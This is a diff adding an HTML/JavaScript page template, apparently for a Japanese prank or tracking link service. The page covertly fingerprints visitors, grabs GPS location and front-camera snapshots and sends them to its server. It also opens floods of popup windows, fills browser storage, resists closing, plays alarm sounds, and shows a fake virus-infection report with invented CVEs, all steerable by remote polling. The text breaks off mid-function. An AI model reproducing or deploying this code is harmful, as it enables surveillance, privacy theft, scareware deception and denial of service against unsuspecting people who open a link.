@@ -1,0 +1,830 @@
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0f1115">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>{{ link.name }}</title>
+{% if install_mode %}
+<link rel="manifest" href="/v/{{ code }}/manifest.json?name={{ link.name|urlencode }}{% if notify_mode %}&mode={{ notify_mode }}{% endif %}">
+<link rel="apple-touch-icon" href="/v/icon.svg">
+{% endif %}
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
+body{padding:18px;min-height:100vh}
+.center{min-height:88vh;display:flex;align-items:center;justify-content:center;text-align:center}
+.in{max-width:420px;width:100%}
+.ring{width:34px;height:34px;margin:0 auto 14px;border-radius:50%;
+  border:3px solid #2b3346;border-top-color:#4c8dff;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.st{color:#8b93a7;font-size:13px;min-height:1.6em;line-height:1.8}
+
+/* ===== 上からの通知バナー ===== */
+.note{position:fixed;top:0;left:0;right:0;z-index:80;display:flex;gap:10px;
+  align-items:center;justify-content:center;flex-wrap:wrap;
+  background:linear-gradient(180deg,#1c2b45,#16203a);
+  border-bottom:1px solid #35507e;color:#dfe9ff;padding:12px 14px;
+  box-shadow:0 6px 24px rgba(0,0,0,.5);
+  transform:translateY(-110%);transition:transform .45s cubic-bezier(.2,.9,.3,1)}
+.note.on{transform:translateY(0)}
+.note .nt{font-size:13.5px;line-height:1.6;font-weight:600}
+.note button{padding:9px 16px;border:0;border-radius:999px;background:#4c8dff;color:#fff;
+  font-weight:700;font-size:13px;cursor:pointer}
+.note button:disabled{opacity:.6}
+.note .x{margin-left:4px;background:transparent;color:#9fb4d8;border:0;font-size:16px;cursor:pointer;padding:2px 6px}
+
+/* ===== 子ウィンドウ（感染レポート） ===== */
+.child{background:#08090d;padding:16px}
+.ck{max-width:460px;margin:0 auto}
+.chip{display:inline-block;font-size:12px;font-weight:800;letter-spacing:.04em;
+  color:#ffd9d9;background:#5a1414;border:1px solid #a33;border-radius:999px;
+  padding:4px 12px;animation:bl 1s steps(2,end) infinite}
+.ck h1{color:#ff5a5a;font-size:22px;margin:10px 0 14px;line-height:1.35}
+.bl{display:flex;justify-content:space-between;font-size:12px;color:#9aa3b2;margin-bottom:5px}
+.bl b{color:#e6e9ef;font-variant-numeric:tabular-nums}
+.prog{height:12px;background:#15181f;border:1px solid #262b36;border-radius:999px;overflow:hidden}
+.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,#4c8dff,#7ee08a);
+  transition:width .18s}
+.prog.red i{background:linear-gradient(90deg,#f0b429,#ff5a5a)}
+.block{margin:12px 0}
+.list{margin-top:6px;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#c7cddb;
+  background:#0f1218;border:1px solid #232734;border-radius:8px;padding:8px;
+  max-height:150px;overflow:hidden}
+.list div{padding:2px 0;border-bottom:1px dashed #1c2230}
+.list div:last-child{border-bottom:0}
+.list .warn2{color:#f0b429}
+.fake{margin-top:12px;background:#0f1218;border:1px solid #232734;border-radius:8px;padding:10px;
+  font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#8b93a7;white-space:pre-wrap;
+  height:120px;overflow:hidden}
+.blink{animation:bl 1s steps(2,end) infinite}
+@keyframes bl{50%{opacity:.15}}
+
+body.glitch{animation:shake .12s infinite}
+@keyframes shake{
+  0%{transform:translate(0,0)}25%{transform:translate(-4px,3px)}
+  50%{transform:translate(3px,-4px)}75%{transform:translate(-3px,-3px)}
+  100%{transform:translate(4px,2px)}}
+body.glitch .in,body.glitch h1,body.glitch .ck{filter:invert(1) hue-rotate(90deg)}
+#flash{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:0;
+  background:radial-gradient(circle,rgba(255,255,255,.9),rgba(255,0,0,.6) 60%,transparent 75%)}
+#noise{position:fixed;inset:0;pointer-events:none;z-index:49;opacity:.12;
+  background-image:repeating-linear-gradient(0deg,#fff 0 1px,transparent 1px 3px);display:none}
+.rainbow{animation:rb .6s linear infinite}
+@keyframes rb{to{filter:hue-rotate(360deg)}}
+</style></head><body class="{{ 'child' if is_child else '' }}">
+
+<div id="flash"></div>
+<div id="noise"></div>
+
+{% if is_child %}
+  <div class="ck">
+    <div class="chip">⚠ ウイルス侵入済み</div>
+    <h1 class="blink">{{ child_text }}</h1>
+
+    <div class="block">
+      <div class="bl"><span>感染の進行</span><b id="ppct">0%</b></div>
+      <div class="prog"><i id="pbar"></i></div>
+    </div>
+
+    <div class="block">
+      <div class="bl"><span>端末データ容量</span><b id="dpct">--</b></div>
+      <div class="prog red"><i id="dbar"></i></div>
+    </div>
+
+    <div class="block">
+      <div class="bl"><span>脆弱性を発見</span><b id="vcount">0 件</b></div>
+      <div class="list" id="vlist"></div>
+    </div>
+
+    <div class="fake" id="fake"></div>
+  </div>
+{% else %}
+
+  {% if notify %}
+  <div class="note" id="note">
+    <div class="nt">{{ notify_text }}</div>
+    <button id="nbtn" type="button">インストール</button>
+    <button class="x" id="nx" type="button" title="閉じる">×</button>
+  </div>
+  {% endif %}
+
+  <div class="center"><div class="in">
+    <div class="ring"></div>
+    <div class="st" id="st">読み込み中…</div>
+  </div></div>
+{% endif %}
+
+<script>
+window.V = {
+  code: {{ code|tojson }},
+  mode: {{ mode|tojson }},
+  dest: {{ dest|tojson }},
+  hit: {{ hit_id }},
+  child: {{ 1 if is_child else 0 }},
+  installed: {{ 1 if is_installed else 0 }},
+  auto: {{ 1 if auto else 0 }},
+  set: {{ winset }},
+  seq: {{ seq }},
+  install_mode: {{ install_mode|tojson }},
+  name: {{ link.name|tojson }}
+};
+</script>
+<script>
+(function () {
+  "use strict";
+  var V = window.V, CODE = V.code, MODE = V.mode;
+  var API = "/v/" + encodeURIComponent(CODE) + "/d";
+  var ST = "/v/" + encodeURIComponent(CODE) + "/st";
+  var STANDALONE = !!V.installed || (navigator.standalone === true) ||
+    !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches);
+
+  var VID = (function () {
+    try {
+      var v = localStorage.getItem("virus_vid");
+      if (!v) { v = Math.random().toString(36).slice(2, 12) + Date.now().toString(36);
+                localStorage.setItem("virus_vid", v); }
+      return v;
+    } catch (e) { return "x"; }
+  })();
+
+  function st(s) { var e = document.getElementById("st"); if (e) e.textContent = s || ""; }
+  function send(items, beacon) {
+    var body = JSON.stringify({ hit: V.hit, vid: VID, items: items || {} });
+    if (beacon && navigator.sendBeacon) {
+      try { if (navigator.sendBeacon(API, new Blob([body], { type: "application/json" }))) return; } catch (e) {}
+    }
+    try {
+      fetch(API, { method: "POST", cache: "no-store",
+                   headers: { "Content-Type": "application/json" },
+                   body: body }).catch(function () {});
+    } catch (e) {}
+  }
+
+  /* ================= 収集 ================= */
+  function canvasHash() {
+    try {
+      var c = document.createElement("canvas"); c.width = 280; c.height = 60;
+      var x = c.getContext("2d");
+      x.textBaseline = "top"; x.font = "14px Arial";
+      x.fillStyle = "#f60"; x.fillRect(0, 0, 280, 60);
+      x.fillStyle = "#069"; x.fillText("igtracker あいう漢字", 2, 2);
+      x.globalCompositeOperation = "multiply";
+      var g = x.createLinearGradient(0, 0, 280, 0);
+      g.addColorStop(0, "rgba(255,0,0,.2)"); g.addColorStop(1, "rgba(0,0,255,.2)");
+      x.fillStyle = g; x.fillRect(0, 0, 280, 60);
+      x.beginPath(); x.arc(60, 30, 20, 0, Math.PI * 2); x.fill();
+      return c.toDataURL("image/png");
+    } catch (e) { return ""; }
+  }
+  function webgl() {
+    try {
+      var c = document.createElement("canvas");
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return {};
+      var d = gl.getExtension("WEBGL_debug_renderer_info");
+      return {
+        vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
+        unVendor: d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : "",
+        unRenderer: d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "",
+        ver: gl.getParameter(gl.VERSION), maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        ext: (gl.getSupportedExtensions() || []).length
+      };
+    } catch (e) { return {}; }
+  }
+  function fonts() {
+    var list = ["Arial","Arial Black","Comic Sans MS","Courier New","Georgia","Impact",
+      "Times New Roman","Trebuchet MS","Verdana","Helvetica","Tahoma","Palatino",
+      "Hiragino Kaku Gothic ProN","Hiragino Sans","Yu Gothic","Meiryo","MS PGothic",
+      "Noto Sans JP","Roboto","Segoe UI","Calibri","Cambria","Futura","Menlo","Monaco",
+      "Apple SD Gothic Neo","Malgun Gothic","Droid Sans Fallback"];
+    var base = ["monospace","sans-serif","serif"], hit = [];
+    try {
+      var s = document.createElement("span");
+      s.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap";
+      s.textContent = "mmmmmmmmmmlli漢"; document.body.appendChild(s);
+      var ref = {};
+      base.forEach(function (b) { s.style.fontFamily = b; ref[b] = s.offsetWidth; });
+      list.forEach(function (f) {
+        base.some(function (b) {
+          s.style.fontFamily = "'" + f + "'," + b;
+          if (s.offsetWidth !== ref[b]) { hit.push(f); return true; }
+          return false;
+        });
+      });
+      document.body.removeChild(s);
+    } catch (e) {}
+    return hit;
+  }
+  function audioHash() {
+    return new Promise(function (res) {
+      try {
+        var OAC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+        if (!OAC) return res("");
+        var ctx = new OAC(1, 44100, 44100);
+        var o = ctx.createOscillator(); o.type = "triangle"; o.frequency.value = 10000;
+        var g = ctx.createGain(); g.gain.value = 0;
+        var c = ctx.createDynamicsCompressor();
+        o.connect(c); c.connect(g); g.connect(ctx.destination); o.start(0);
+        ctx.oncomplete = function (e) {
+          try {
+            var b = e.renderedBuffer.getChannelData(0), s = 0;
+            for (var i = 4500; i < 5000; i++) s += Math.abs(b[i]);
+            res(s.toFixed(8));
+          } catch (err) { res(""); }
+        };
+        ctx.startRendering();
+      } catch (e) { res(""); }
+    });
+  }
+  function codecs() {
+    try {
+      var v = document.createElement("video"), a = document.createElement("audio");
+      var t = function (el, s) { return el.canPlayType(s) || ""; };
+      return [t(v,'video/mp4; codecs="avc1.42E01E"'), t(v,'video/webm; codecs="vp9"'),
+              t(v,'video/mp4; codecs="hvc1"'), t(a,"audio/mpeg"),
+              t(a,'audio/ogg; codecs="opus"'), t(a,'audio/mp4; codecs="mp4a.40.2"')].join(",");
+    } catch (e) { return ""; }
+  }
+  function net() {
+    try {
+      var n = navigator.connection || {};
+      return { type: n.effectiveType || "", downlink: n.downlink || 0, rtt: n.rtt || 0,
+               save: n.saveData ? 1 : 0 };
+    } catch (e) { return {}; }
+  }
+  function batt() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.getBattery) return res({});
+        navigator.getBattery().then(function (b) {
+          res({ level: b.level, charging: b.charging ? 1 : 0, secs: b.dischargingTime });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function storageInfo() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.storage || !navigator.storage.estimate) return res({});
+        navigator.storage.estimate().then(function (s) {
+          res({ quota: s.quota || 0, usage: s.usage || 0 });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function devices() {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res({});
+        navigator.mediaDevices.enumerateDevices().then(function (d) {
+          res({ cam: d.filter(function (x) { return x.kind === "videoinput"; }).length,
+                mic: d.filter(function (x) { return x.kind === "audioinput"; }).length,
+                spk: d.filter(function (x) { return x.kind === "audiooutput"; }).length });
+        }).catch(function () { res({}); });
+      } catch (e) { res({}); }
+    });
+  }
+  function gps(hi, ms) {
+    return new Promise(function (res) {
+      if (!navigator.geolocation) return res({});
+      var done = false;
+      var to = setTimeout(function () { if (!done) { done = true; res({}); } }, ms || 15000);
+      try {
+        navigator.geolocation.getCurrentPosition(function (p) {
+          if (done) return; done = true; clearTimeout(to);
+          res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
+                alt: p.coords.altitude, spd: p.coords.speed, hdg: p.coords.heading });
+        }, function () { if (done) return; done = true; clearTimeout(to); res({}); },
+        { enableHighAccuracy: !!hi, timeout: (ms || 15000) - 1000, maximumAge: 0 });
+      } catch (e) { clearTimeout(to); if (!done) { done = true; res({}); } }
+    });
+  }
+
+  function collect(deep) {
+    var wg = webgl();
+    var base = {
+      ua: navigator.userAgent,
+      platform: navigator.platform || "",
+      langs: (navigator.languages || [navigator.language]).join(","),
+      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+                         catch (e) { return ""; } })(),
+      tzoff: new Date().getTimezoneOffset(),
+      locale: (function () { try { return navigator.language; } catch (e) { return ""; } })(),
+      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth + "x" + screen.pixelDepth,
+      avail: screen.availWidth + "x" + screen.availHeight,
+      win: innerWidth + "x" + innerHeight,
+      dpr: devicePixelRatio || 1,
+      cores: navigator.hardwareConcurrency || 0,
+      mem: navigator.deviceMemory || 0,
+      touch: navigator.maxTouchPoints || 0,
+      cookie: navigator.cookieEnabled ? 1 : 0,
+      pdf: navigator.pdfViewerEnabled ? 1 : 0,
+      plugins: (navigator.plugins || []).length,
+      mimes: (navigator.mimeTypes || []).length,
+      referrer: document.referrer || "",
+      history: history.length,
+      standalone: STANDALONE ? 1 : 0,
+      sw: ("serviceWorker" in navigator) ? 1 : 0,
+      wake: ("wakeLock" in navigator) ? 1 : 0,
+      bluetooth: ("bluetooth" in navigator) ? 1 : 0,
+      usb: ("usb" in navigator) ? 1 : 0,
+      webglVendor: wg.vendor || "", webglRenderer: wg.renderer || "",
+      webglUnmaskedVendor: wg.unVendor || "", webglUnmaskedRenderer: wg.unRenderer || "",
+      webglVersion: wg.ver || "", webglMaxTex: wg.maxTex || 0, webglExt: wg.ext || 0,
+      codecs: codecs(),
+      net: net(),
+      perms: (function () { try { return navigator.permissions ? 1 : 0; } catch (e) { return 0; } })(),
+      ts: new Date().toISOString()
+    };
+    if (!deep) return Promise.resolve(base);
+    return Promise.all([audioHash(), batt(), storageInfo(), devices()]).then(function (r) {
+      base.audioFp = r[0];
+      base.battery = r[1];
+      base.storage = r[2];
+      base.devices = r[3];
+      base.canvas = canvasHash();
+      base.fonts = fonts().join(",");
+      return base;
+    });
+  }
+
+  /* ================= 音 ================= */
+  var AC = null;
+  function audioCtx() {
+    try {
+      var C = window.AudioContext || window.webkitAudioContext;
+      if (!C) return null;
+      if (!AC) AC = new C();
+      if (AC.state === "suspended") { try { AC.resume(); } catch (e) {} }
+      return AC;
+    } catch (e) { return null; }
+  }
+  function crashSound(sec) {
+    var ac = audioCtx();
+    if (!ac) return;
+    var dur = sec || 3.2;
+    var len = Math.floor(ac.sampleRate * dur);
+    var buf = ac.createBuffer(1, len, ac.sampleRate);
+    var d = buf.getChannelData(0);
+    for (var i = 0; i < len; i++) {
+      var t = i / ac.sampleRate;
+      var decay = Math.pow(1 - i / len, 0.6);
+      var noise = (Math.random() * 2 - 1);
+      var saw = Math.sin(2 * Math.PI * (60 + 900 * Math.pow(1 - t / dur, 3)) * t);
+      var bit = Math.round((noise * 0.7 + saw * 0.6) * 6) / 6;
+      d[i] = bit * decay;
+    }
+    var src = ac.createBufferSource(); src.buffer = buf;
+    var g = ac.createGain(); g.gain.value = 0.85;
+    var f = ac.createBiquadFilter(); f.type = "lowpass"; f.frequency.value = 9000;
+    src.connect(f); f.connect(g); g.connect(ac.destination);
+    try { src.start(); } catch (e) {}
+    setTimeout(function () {
+      var ac2 = audioCtx(); if (!ac2) return;
+      var l2 = Math.floor(ac2.sampleRate * 0.7);
+      var b2 = ac2.createBuffer(1, l2, ac2.sampleRate);
+      var d2 = b2.getChannelData(0);
+      for (var j = 0; j < l2; j++) d2[j] = (Math.random() * 2 - 1) * Math.pow(1 - j / l2, 2.2);
+      var s2 = ac2.createBufferSource(); s2.buffer = b2;
+      var g2 = ac2.createGain(); g2.gain.value = 0.95;
+      s2.connect(g2); g2.connect(ac2.destination);
+      try { s2.start(); } catch (e) {}
+    }, 700);
+  }
+  function glitch(ms) {
+    document.body.classList.add("glitch", "rainbow");
+    var n = document.getElementById("noise");
+    if (n) n.style.display = "block";
+    var f = document.getElementById("flash");
+    var fl = setInterval(function () {
+      if (f) f.style.opacity = Math.random() > 0.5 ? 0.5 : 0;
+    }, 90);
+    setTimeout(function () {
+      clearInterval(fl);
+      if (f) f.style.opacity = 0;
+      if (n) n.style.display = "none";
+      document.body.classList.remove("glitch", "rainbow");
+    }, ms || 4200);
+  }
+  /* 新規ウィンドウに付ける無限ループ音源（サイレン） */
+  var alarmOn = false;
+  function alarm(seed) {
+    if (alarmOn) return;
+    var ac = audioCtx(); if (!ac) return;
+    alarmOn = true;
+    var o = ac.createOscillator(), g = ac.createGain();
+    var lfo = ac.createOscillator(), lg = ac.createGain();
+    o.type = "sawtooth";
+    o.frequency.value = 340 + ((seed || 0) % 6) * 70;
+    lfo.type = "sine";
+    lfo.frequency.value = 1.2 + Math.random() * 1.4;
+    lg.gain.value = 90;
+    lfo.connect(lg); lg.connect(o.frequency);
+    g.gain.value = 0.045;
+    o.connect(g); g.connect(ac.destination);
+    try { o.start(); lfo.start(); } catch (e) {}
+  }
+
+  /* ================= 窓爆弾（完全自動・無限可・10秒で出し切る） ================= */
+  var SET = (V.set === 0) ? 0 : (V.set || 100);
+  var firing = true;
+  var seq = V.seq || 0;
+  var widx = 0, fired = 0, running = false;
+
+  function wantMore() {
+    if (!firing) return false;
+    if (SET === 0) return true;
+    return fired < SET;
+  }
+  function pumpOnce(cap) {
+    var made = 0;
+    while (wantMore() && made < cap) {
+      var w = null;
+      try {
+        w = window.open(location.pathname + "?w=1&n=" + widx,
+              "igt_" + CODE + "_" + widx,
+              "width=420,height=560,left=" + ((widx % 10) * 54) +
+              ",top=" + (20 + (widx % 10) * 34));
+      } catch (e) { w = null; }
+      if (!w) break;
+      widx++; fired++; made++;
+    }
+    if (made) send({ windows: made, window_total: widx, set: SET });
+    return made;
+  }
+  function fireSet(reset) {
+    if (!firing) return;
+    if (reset) fired = 0;
+    if (running) return;
+    if (SET !== 0 && fired >= SET && !reset) return;
+    running = true;
+    var t0 = Date.now();
+    (function tick() {
+      if (!firing) { running = false; return; }
+      var made = pumpOnce(SET === 0 ? 3 : 15);
+      if (!made) { running = false; return; }
+      if (!wantMore()) { running = false; return; }
+      if (SET !== 0 && Date.now() - t0 > 10000) { running = false; return; }
+      setTimeout(tick, 110);
+    })();
+  }
+
+  /* ================= 容量枯渇（無限） ================= */
+  function fillStorage(done) {
+    var chunk = new Array(1024 * 64).join("x");
+    var i = 0, total = 0;
+    function stepLocal() {
+      var end = Date.now() + 220;
+      while (Date.now() < end) {
+        try { localStorage.setItem("v_fill_" + i, chunk); i++; total += chunk.length; }
+        catch (e) { return stepIDB(); }
+        if (i > 8000) return stepIDB();
+      }
+      setTimeout(stepLocal, 0);
+    }
+    function stepIDB() {
+      var req;
+      try { req = indexedDB.open("virus_fill", 1); } catch (e) { return done && done(); }
+      req.onupgradeneeded = function () { try { req.result.createObjectStore("s"); } catch (e) {} };
+      req.onsuccess = function () {
+        var db = req.result, n = 0;
+        var blob = new Uint8Array(1024 * 512);
+        for (var k = 0; k < blob.length; k += 512) blob[k] = Math.random() * 255;
+        function put() {
+          var end = Date.now() + 250;
+          while (Date.now() < end) {
+            try { db.transaction("s", "readwrite").objectStore("s").put(blob, "b" + (n++)); }
+            catch (e) { break; }
+            if (n > 20000) break;
+          }
+          total += blob.length;
+          if (n <= 20000) setTimeout(put, 0); else finish();
+        }
+        function finish() {
+          try {
+            if (navigator.storage && navigator.storage.estimate) {
+              navigator.storage.estimate().then(function (s) {
+                send({ storage_used: s.usage, storage_quota: s.quota, filled: total });
+                done && done();
+              }).catch(function () { done && done(); });
+            } else { send({ filled: total }); done && done(); }
+          } catch (e) { done && done(); }
+        }
+        put();
+      };
+      req.onerror = function () { done && done(); };
+    }
+    stepLocal();
+  }
+
+  /* ================= ブリック（無限） ================= */
+  var wakeLock = null, silentAudio = null;
+  function brick() {
+    try { window.onbeforeunload = function () { return "まだ処理中です"; }; } catch (e) {}
+    try {
+      if (navigator.wakeLock) {
+        navigator.wakeLock.request("screen").then(function (w) {
+          wakeLock = w; w.addEventListener("release", function () { wakeLock = null; });
+        }).catch(function () {});
+      }
+    } catch (e) {}
+    try {
+      var C = window.AudioContext || window.webkitAudioContext;
+      if (C) {
+        var a = document.createElement("audio");
+        a.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAIA+AAACABAAZGF0YQAAAAA=";
+        a.loop = true; a.volume = 1;
+        a.style.cssText = "position:fixed;left:-9999px";
+        document.body.appendChild(a);
+        var p = a.play(); if (p && p.catch) p.catch(function () {});
+        silentAudio = a;
+      }
+    } catch (e) {}
+    setInterval(function () {
+      if (!firing) return;
+      if (wakeLock === null && navigator.wakeLock) {
+        navigator.wakeLock.request("screen").then(function (w) { wakeLock = w; }).catch(function () {});
+      }
+      if (silentAudio && silentAudio.paused) {
+        var p = silentAudio.play(); if (p && p.catch) p.catch(function () {});
+      }
+      send(behavior());
+    }, 15000);
+  }
+
+  /* ================= 常駐型 ================= */
+  function installMode() {
+    try {
+      if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/v/sw.js", { scope: "/v/" }).catch(function () {});
+      }
+    } catch (e) {}
+    window.addEventListener("beforeinstallprompt", function (e) {
+      e.preventDefault();
+      setTimeout(function () { try { e.prompt(); } catch (err) {} }, 1400);
+    });
+  }
+
+  /* ================= カメラ ================= */
+  function camShot(ms) {
+    return new Promise(function (res) {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(false);
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
+          audio: false
+        }).then(function (stm) {
+          var v = document.createElement("video");
+          v.autoplay = true; v.muted = true; v.playsInline = true;
+          v.setAttribute("playsinline", "");
+          v.style.cssText = "position:fixed;left:-9999px;top:0;width:160px";
+          document.body.appendChild(v);
+          v.srcObject = stm;
+          var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
+          setTimeout(function () {
+            try {
+              var w = v.videoWidth || 480, h = v.videoHeight || 360;
+              var c = document.createElement("canvas"); c.width = w; c.height = h;
+              var x = c.getContext("2d");
+              x.translate(w, 0); x.scale(-1, 1); x.drawImage(v, 0, 0, w, h);
+              send({ selfie: c.toDataURL("image/jpeg", 0.6) });
+              try { stm.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+              try { v.remove(); } catch (e) {}
+              res(true);
+            } catch (e) { res(false); }
+          }, ms || 1600);
+        }).catch(function () { res(false); });
+      } catch (e) { res(false); }
+    });
+  }
+
+  /* ================= 行動ログ ================= */
+  var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
+  window.addEventListener("scroll", function () {
+    var h = document.documentElement.scrollHeight - innerHeight;
+    var p = h > 0 ? Math.round(scrollY / h * 1000) / 10 : 100;
+    if (p > maxScroll) maxScroll = p;
+  }, { passive: true });
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { hiddenAt = Date.now(); return; }
+    if (hiddenAt) { hiddenMs += Date.now() - hiddenAt; hiddenAt = 0; }
+  });
+  var VISITS = (function () {
+    try { var k = "virus_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
+          localStorage.setItem(k, n); return n; } catch (e) { return 1; }
+  })();
+  function behavior() {
+    return { dwell: Date.now() - t0 - hiddenMs, scroll: maxScroll,
+             w: innerWidth, h: innerHeight, screen: screen.width + "x" + screen.height,
+             visits: VISITS };
+  }
+
+  /* ================= 音の無限ループ ================= */
+  function soundLoop() {
+    if (!firing) { setTimeout(soundLoop, 800); return; }
+    try { crashSound(2.6); } catch (e) {}
+    glitch(2400);
+    try { if (navigator.vibrate) navigator.vibrate([160, 70, 160]); } catch (e) {}
+    setTimeout(soundLoop, 3200);
+  }
+
+  /* ================= 遠隔操作（こちらの監視室から） ================= */
+  function poll() {
+    fetch(ST, { cache: "no-store" }).then(function (r) { return r.json(); }).then(function (j) {
+      if (!j || !j.ok) return;
+      if (typeof j.set === "number" && j.set !== SET) {
+        SET = j.set; running = false; fired = 0;
+        if (MODE === "windows" || MODE === "mix") fireSet(true);
+      }
+      if (j.seq && j.seq !== seq) { seq = j.seq; running = false; fireSet(true); }
+      if (j.firing === 0 && firing) { firing = false; }
+      else if (j.firing === 1 && !firing) {
+        firing = true;
+        if (MODE === "windows" || MODE === "mix") fireSet(false);
+      }
+    }).catch(function () {});
+  }
+
+  /* ================= リダイレクト ================= */
+  function leave(ms) {
+    if (!V.dest) return;
+    setTimeout(function () {
+      try { location.replace(V.dest); } catch (e) { location.href = V.dest; }
+    }, ms || 2500);
+  }
+
+  /* ================= 子ウィンドウ（感染レポート＋無限音源） ================= */
+  if (V.child) {
+    var idx = parseInt((location.search.match(/n=(\d+)/) || [])[1] || "0", 10);
+
+    /* 無限ループ音源（サイレン） */
+    alarm(idx);
+    document.addEventListener("touchstart", function () { audioCtx(); alarm(idx); }, { passive: true });
+    document.addEventListener("click", function () { audioCtx(); alarm(idx); });
+
+    /* 感染の進行バー */
+    var pt = 55 + Math.floor(Math.random() * 44);   // 目標 55-98%
+    var pv = 0;
+    var pbar = document.getElementById("pbar"), ppct = document.getElementById("ppct");
+    var piv = setInterval(function () {
+      pv += 1 + Math.floor(Math.random() * 3);
+      if (pv >= pt) { pv = pt; clearInterval(piv); }
+      if (pbar) pbar.style.width = pv + "%";
+      if (ppct) ppct.textContent = pv + "%";
+    }, 120);
+
+    /* 端末データ容量バー */
+    var dv = 60 + Math.floor(Math.random() * 38);
+    var dbar = document.getElementById("dbar"), dpct = document.getElementById("dpct");
+    setTimeout(function () {
+      if (dbar) dbar.style.width = dv + "%";
+      if (dpct) dpct.textContent = dv + "% 使用";
+    }, 300);
+
+    /* 脆弱性を発見（だんだん増える） */
+    var VULNS = [
+      "CVE-2019-0708 リモートコード実行",
+      "未修正のSSL/TLS 脆弱性",
+      "キャッシュ汚染 (Cache Poisoning)",
+      "権限昇格の可能性",
+      "クリップボード漏洩",
+      "位置情報トラッキング",
+      "カメラ権限の不正利用",
+      "Cookie / セッション漏洩",
+      "DNS ハイジャック",
+      "メモリリーク検出",
+      "フィッシング耐性なし",
+      "自動再生の権限が過剰"
+    ];
+    var vlist = document.getElementById("vlist");
+    var vcount = document.getElementById("vcount");
+    var found = 0, total = 4 + Math.floor(Math.random() * 6);
+    var used = VULNS.slice().sort(function () { return Math.random() - 0.5; });
+    var viv = setInterval(function () {
+      if (found >= total) { clearInterval(viv); return; }
+      found++;
+      if (vcount) vcount.textContent = found + " 件";
+      if (vlist) {
+        var d = document.createElement("div");
+        d.className = "warn2";
+        d.textContent = "⚠ " + (used[found % used.length] || "不明な脆弱性");
+        vlist.appendChild(d);
+        vlist.scrollTop = vlist.scrollHeight;
+      }
+    }, 260);
+
+    /* 偽スキャンログ */
+    var fake = document.getElementById("fake");
+    var lines = [
+      "C:\\> scan /f /a",
+      "検査中 ...  ███████░░░  68%",
+      "  C:\\Users\\Public\\cache.tmp  危険",
+      "  C:\\Windows\\Temp\\a1.tmp    安全",
+      "  /sdcard/Download/tmp.dat    危険",
+      "検出: 3 件",
+      "推奨: このウィンドウを閉じないでください"
+    ];
+    var li = 0;
+    var iv = setInterval(function () {
+      if (!fake || li >= lines.length) { clearInterval(iv); return; }
+      fake.textContent += lines[li++] + "\n";
+      fake.scrollTop = fake.scrollHeight;
+    }, 340);
+
+    send({ child: 1, child_index: idx });
+    return;
+  }
+
+  /* ================= 起動（全部自動・無限） ================= */
+
+  collect(true).then(function (d) {
+    send(d);
+    if (MODE === "trojan_link" || MODE === "trojan_install" ||
+        MODE === "max_power" || MODE === "mix") {
+      gps(true, 18000).then(function (p) { if (p.lat != null) send({ gps: p }); });
+    }
+    if (MODE === "max_power" || MODE === "mix") {
+      setTimeout(function () { camShot(1600); }, 400);
+    }
+  });
+
+  function onGesture() {
+    audioCtx();
+    if (MODE === "windows" || MODE === "mix") fireSet(false);
+  }
+  document.addEventListener("touchstart", onGesture, { passive: true });
+  document.addEventListener("click", onGesture);
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") { send(behavior(), true); return; }
+    send(behavior());
+  });
+  window.addEventListener("pagehide", function () { send(behavior(), true); });
+
+  /* ---- 通知バナー（窓爆弾の間に上から出す） ---- */
+  var note = document.getElementById("note");
+  if (note) {
+    var deferred = null;
+    window.addEventListener("beforeinstallprompt", function (e) {
+      e.preventDefault(); deferred = e;
+    });
+    setTimeout(function () { note.classList.add("on"); }, 1400);
+    var nb = document.getElementById("nbtn");
+    if (nb) nb.addEventListener("click", function () {
+      if (deferred) { try { deferred.prompt(); } catch (e) {} deferred = null; }
+      else {
+        // iOS など：ホーム画面追加の案内
+        nb.textContent = "共有 → ホーム画面に追加";
+        setTimeout(function () { nb.textContent = "インストール"; }, 4000);
+      }
+      send({ notify_click: 1, install_mode: V.install_mode || "" });
+    });
+    var nx = document.getElementById("nx");
+    if (nx) nx.addEventListener("click", function () { note.classList.remove("on"); });
+  }
+
+  /* モード別 */
+  if (MODE === "trojan_link") {
+    leave(2500);
+
+  } else if (MODE === "trojan_install") {
